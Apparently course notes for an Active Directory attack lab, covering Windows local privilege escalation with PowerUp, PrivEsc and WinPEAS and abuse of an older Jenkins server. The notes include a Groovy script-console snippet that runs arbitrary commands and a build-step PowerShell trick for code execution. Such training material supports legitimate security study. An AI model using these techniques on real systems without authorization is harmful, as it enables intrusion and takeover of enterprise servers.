
# **Local Privilege Escalation**

There are various ways of locally escalating privileges on windows box -:
- Missing patches
- Automated deployment and Auto Logon passwords in clear text
- AlwaysInstallElevated (Any user can run MSI as SYSTEM)
- Misconfigured Services
- DLL Hijacking and more
- NTLM Relaying a.k.a won't fix


We can use below tools for complete coverage


- PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- PrivEsc - https://github.com/enjoiz/Privesc
- WinPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/

Service Issues using `PowerUp`

- Get services with unquoted paths and a space in their name


```powershell
$ Get-ServiceUnqouted -Verbose
```



- Get services where the current user can write to its binary or change arguments to the binary

```powershell
$ Get-ModifiableServiceFile -Verbose
```



- Get the services whose configuration current user can modify

```powershell
$ Get-ModifiableService -Verbose
```



We can also automate this by using the below commands


```powershell
# For Powerup
$ Invoke-AllChecks

# For PrivEsc
$ Invoke-PrivEsc

# For PEASS-ng
$ winPEASx64.exe
```


**Feature Abuse**

• What we have been doing up to now (and will keep doing further in the
class) is relying on features abuse.
• Features abuse are awesome as there are seldom patches for them and
they are not the focus of security teams!
• One of my favorite features abuse is targeting enterprise applications
which are not built keeping security in mind.
• On Windows, many enterprise applications need either Administrative
privileges or SYSTEM privileges making them a great avenue for privilege
escalation.

**Example - Jenkins -:**


• Let’s use an older version of Jenkins as an example of vulnerable
Enterprise application.
• Jenkins is a widely used Continuous Integration tool.
• There are many interesting aspects with Jenkins but for now we would
limit our discussion to the ability of running system commands on
Jenkins.
• There is a Jenkins server running on dcorp-ci (172.16.3.11) on port
8080.

**Exploit -:**

- If we have admin access (default installation before 2.x)
- Navigate to `http://<jenkins_server/script`
- Now paste in below groovy script, Make sure to replace [INSERT COMMAND] with your own command

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```



- If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter-:

```
powershell -c <command>
```
 
- Again, you could download and execute scripts, run encoded scripts and more.


# **Learning Objective 5**


- Exploit a service on dcorp-studentx and elevate privileges to local administrator.
- Identify a machine in the domain where studentx has local administrative access. 
- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server


## **Solution**


**_Coming Soon_**

